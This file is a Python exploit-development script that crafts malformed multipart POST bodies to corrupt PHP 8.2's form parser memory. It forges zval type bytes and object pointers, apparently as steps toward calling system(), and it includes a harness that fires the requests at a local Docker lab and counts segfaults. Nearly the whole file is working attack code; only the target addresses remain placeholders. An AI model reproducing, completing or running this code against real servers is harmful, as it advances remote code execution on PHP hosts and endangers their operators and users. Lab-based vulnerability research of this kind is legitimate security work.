#!/usr/bin/env python3
"""payload68: weaponized drop-in replacement for oom67's body builder.

Signature-compatible: build_attack(k1, stamp_base, ...) / poison_part(...).
target_obj=0 (default) -> byte-identical to oom67 (zz filler, current crash).
Non-zero targets -> weaponized cells at the walked-slot boundary.

SOURCE VERDICTS (php-8.2.34, verified in container):
1. Destroy path: zend_array_destroy -> i_zval_ptr_dtor -> rc_dtor_func
   -> zend_rc_dtor_func[GC_TYPE(p)](p) -> zend_objects_store_del(object)
   -> object->handlers->free_obj(object).  rdi at free_obj = object addr.
   ce IS dereferenced BEFORE free_obj (store_del's dtor gate reads
   object->ce->destructor) unless handlers->dtor_obj == default.
2. Empirical stock crash is NOT the object path: type byte 0x7a ('z')
   indexes zend_rc_dtor_func[122] OUT OF BOUNDS -> wild call, rdi =
   zval.value bytes. The type byte is the real knob.
3. NUL does NOT survive part names: php_ap_getword/estrdup + getword_conf/
   substring_conf(strlen) all stop at 0x00. Quotes/backslash/CR/LF/;=-
   also forbidden. Survivor alphabet below.
4. Layout: zval.value(8)=cellN[14:16]+cellN+1[0:6]; type_info(4)=
   cellN+1[6:10]; u2(4)=cellN+1[10:14]; bucket.h(8)=cellN+1[14:16]+
   cellN+2[0:6]; bucket.key(8)=cellN+2[6:16].
"""
import re
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
LIB = "/usr/lib/apache2/modules/libphp.so"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
PHPLAB = "/Users/vlad/Projects/queue/php2shell-lab"
HEXD = b"0123456789abcdef"
KEYLEN = 3064
PREP = 3
POISON_PAGES = 40
CELLS = 10237
K1S = [1900, 1950, 2000, 2044, 2100, 2200, 2400, 2600, 2800, 3000, 3200, 3400]

# Placeholder runtime addresses (main thread must measure; 0 = benign mode).
TARGET_OBJ = 0     # address where our fake object will sit (sprayed region)
TARGET_TABLE = 0   # address of fake handler table (also attacker bytes)
SYSTEM_ADDR = 0    # runtime &system in stock libphp (unresolved so far)

# Encoding survivor alphabet (rfc1867-safe, NUL-free, printable): the 6
# low-pointer bytes must carry arbitrary nibbles -> hex digits only (16).
POINTER_HEX = HEXD  # 0-9a-f, all safe: no NUL " ' \\ ; = space CR LF


def sh(cmd, timeout=25, retries=2):
    for _ in range(retries + 1):
        try:
            r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                               capture_output=True, timeout=timeout)
            return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:150]).strip()
        except subprocess.TimeoutExpired:
            time.sleep(1)
    return "<<EXEC TIMEOUT>>"


def cell_pattern(target_obj, phase=7):
    """16-byte periodic cell C tiling the KEY fillers. The walked zval
    reads a cyclic 8-byte window of repeated C; which window depends on
    the reclaim PHASE k (measured: stock=7, instrument=14).
    Aim: C[(phase+i)%16] = pointer byte i (LE), bytes 6-7 of the value
    are 0x7a7a (NULs can't ride in names)."""
    t = ptr6(target_obj)
    val = t + b"zz"                     # 8 target bytes for the window
    C = bytearray(b"z" * 16)
    for i in range(8):
        C[(phase + i) % 16] = val[i]
    return bytes(C)


def key_part(i, pattern=None, value_tile=None):
    """One form field. pattern: 16B tile tiling the NAME text (aiming).
    value_tile: 16B tile repeated to fill the VALUE (binary-safe carrier,
    NUL-safe). SAME-ENVELOPE: when value grows, name shrinks by the same
    amount (multiple of 16 to keep the measured name-length phase)."""
    filler = (pattern * ((KEYLEN - 8) // 16 + 1))[:KEYLEN - 8] if pattern else b"K" * (KEYLEN - 8)
    val = b"v"
    if value_tile:
        reps = 1537 // len(value_tile)        # adaptive: any tile -> 1537B
        val = value_tile * reps
        val += b"P" * (1537 - len(val))
        filler = filler[:len(filler) - 1536]  # shrink name by exactly 1536
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + filler +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + val + b"\r\n"


def ptr6(v):
    """Low 6 bytes of a 64-bit address as RAW little-endian bytes.
    NOTE: raw pointer bytes must individually survive rfc1867 (no NUL,
    quote, backslash, ;, =, CR, LF). Page-aligned bases end in 0x00 ->
    callers must pick an offset inside the sprayed region (e.g. +0x10)
    so the low byte is nonzero. asserted in cell()."""
    assert v >> 48 == 0, "address must fit 48 bits"
    return (v & 0xFFFFFFFFFFFF).to_bytes(6, "little")


def cell(stamp, payload16=None, stamp_override=None):
    """One 16-byte poison cell: 6-byte stamp + 10 payload bytes.
    payload16=None -> zz filler (benign, current crash behavior).
    stamp_override: raw 6 bytes replacing the hex stamp (used for
    pointer halves that land on stamp positions)."""
    st = stamp_override if stamp_override is not None else stamp
    body = payload16 if payload16 is not None else b"z" * 10
    assert len(st) == 6 and len(body) == 10
    for b in st + body:
        assert b not in (0x00, 0x0a, 0x0d, 0x22, 0x27, 0x5c, 0x3b, 0x3d), "unsafe byte %02x" % b
    return st + body


def poison_part(n, stamp_offset, weapon=None):
    """One ~40-page poison NAME. weapon: None (benign) or dict:
      boundary: absolute stamp index of cell N (zval starts at cellN[14])
      fields:   dict with optional keys:
        value_lo6  (bytes[0:6] of target addr, hex-ascii 12 chars)
        type_info4 (4 raw bytes, survivor alphabet; or None=zz)
        u2_4, h_lo6, key_lo6  (same rules)
    Cell mapping (measured):
      cellN[14:16]        = zval.value bytes[0:2]
      cellN+1[0:6]        = zval.value bytes[2:8]  <- TARGET_OBJ low 6
      cellN+1[6:10]       = zval.u1.type_info
      cellN+1[10:14]      = zval.u2
      cellN+1[14:16]      = bucket.h bytes[0:2]
      cellN+2[0:6]        = bucket.h bytes[2:8]
      cellN+2[6:16]       = bucket.key bytes[0:10] (top 6 wasted)
    """
    namelen = POISON_PAGES * 4096 - 25
    total = namelen - 1 - 6
    ncells = total // 16
    pad = total - ncells * 16
    idx = stamp_offset
    body = bytearray()
    for c in range(ncells):
        stamp = bytes([HEXD[(idx >> (4 * (5 - k))) & 0xF] for k in range(6)])
        pay = None
        so = None
        if weapon and weapon.get("boundary") is not None:
            rel = idx - weapon["boundary"]  # 0 = cell N+1 (the type cell)
            f = weapon["fields"]
            if rel == -1:
                # cellN[6:16] = zval.value bytes[0:2] are at [14:16] here
                pay = b"z" * 8 + f.get("value_b01", b"zz")
            elif rel == 0:
                # stamp = zval.value bytes[2:8] -> POINTER LOW 6 BYTES
                so = f.get("value_b26", b"zzzzzz")
                # payload[0:4] = type_info, payload[4:8] = u2
                pay = f.get("type_info4", b"zzzz") + f.get("u2_4", b"zzzz") + b"zz"
            elif rel == 1:
                # stamp = bucket.h bytes[0:6]
                so = f.get("h_b26", b"zzzzzz")
                # payload[0:2] = h bytes[6:8], payload[2:10] = key bytes[0:8]
                pay = f.get("h_b78", b"zz") + f.get("key_b08", b"zzzzzzzz")
        body += cell(stamp, pay, stamp_override=so)
        idx += 1
    body += b"p" * pad
    nm = b"q" + bytes(body) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def weapon_fields(target_obj):
    """Boundary = stamp index of cell N+1 (the type cell).
    zval.value = cellN[14:16] + cellN+1[0:6]:
      bytes 0-1 (high 16 of our 48-bit ptr) -> cellN payload tail
      bytes 2-5 -> stamp of the type cell (raw bytes, stamp_override)
      bytes 6-7 -> stamp tail 'zz' = 0x7a7a (NULs can't ride in names!)
    So rdi = 0x7a7a_<b3 b2 b1 b0>_<b5 b4>. Distinct from both the 'K'
    crash and pure-zz crashes: 0x7a7a prefix = weaponized signature."""
    t = ptr6(target_obj)
    return {"boundary": None, "fields": {
        "value_b01": t[4:6],          # cellN[14:16]
        "value_b26": t[0:4] + b"zz",  # type-cell stamp (6B)
    }}


def build_attack(k1, stamp_base, target_obj=0, target_table=0, system_addr=0,
                 value_tile=None):
    """value_tile: bytes (all parts) or callable(i) -> 16B-or-None per part."""
    pat = cell_pattern(target_obj) if target_obj else None

    def vt(i):
        if callable(value_tile):
            return value_tile(i)
        return value_tile

    ps = [key_part(i, pattern=pat, value_tile=vt(i)) for i in range(k1)]
    ps += [poison_part(n, stamp_base + n * CELLS) for n in range(PREP)]
    ps += [key_part(i, pattern=pat, value_tile=vt(i)) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def post(att):
    req = urllib.request.Request(LAB + "/oom_mod.php", data=att,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return "200", r.read(150).decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return "HTTP%s" % e.code, e.read(150).decode("latin1", "replace")
    except Exception as e:
        return type(e).__name__, str(e)[:50]


def full_logs():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return (r.stdout + r.stderr).decode("latin1", "replace")


def main():
    print("=== [0] drop-in identity check vs oom67 (benign mode) ===", flush=True)
    import oom67
    for k1 in (3400, 2044):
        a, b = build_attack(k1, 5000000), oom67.build_attack(k1, 5000000)
        print("k1=%d identical=%s len=%d" % (k1, a == b, len(a)), flush=True)

    print("=== [1] survivor-alphabet self-check ===", flush=True)
    bad = build_attack(3400, 5000000, target_obj=0x414141414141)
    nm = re.search(b'name="p([^"]*)"', bad).group(1)
    sig = nm.count(b"\x41\x41\x41\x41\x7a\x7a")
    print("key filler len=%d periodic-C chunks=%d ok" % (len(nm), sig), flush=True)

    print("=== [2] live fires: benign 2, then weaponized 3 ===", flush=True)
    md5 = sh("md5sum %s | cut -d' ' -f1" % LIB, 15)
    if md5 != STOCK_MD5:
        print("[ABORT] md5=%s" % md5, flush=True)
        return
    ini = "memory_limit=8M\nmax_input_vars=100000\npost_max_size=4096M\n"
    subprocess.run(["docker", "exec", "-i", "php_vuln", "sh", "-c",
                    "cat > /usr/local/etc/php/conf.d/30-oomlab.ini"],
                   input=ini.encode(), capture_output=True)
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(25):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 http://127.0.0.1/oom_sapi.php", 10, 1):
            break
    base = len(re.findall(r"exit signal Segmentation", full_logs()))
    # recipe: warm sweep -> sacrifice -> fires
    for k1 in K1S[:-1]:
        code, _ = post(build_attack(k1, 5000000))
        print("warm k1=%d: %s" % (k1, code), flush=True)
    code, _ = post(build_attack(3400, 5100000))
    print("SACRIFICE: %s" % code, flush=True)
    for fi in range(2):
        code, _ = post(build_attack(3400, 5200000 + fi * 100000))
        print("benign-fire%d: %s" % (fi, code), flush=True)
    for fi in range(3):
        code, body = post(build_attack(3400, 5300000 + fi * 100000,
                                       target_obj=0x414141414141))
        print("wpn-fire%d: %s %r" % (fi, code, body[:60]), flush=True)
    print("segv delta=%d" % (len(re.findall(r"exit signal Segmentation", full_logs())) - base),
          flush=True)
    print("=== done ===", flush=True)


if __name__ == "__main__":
    main()
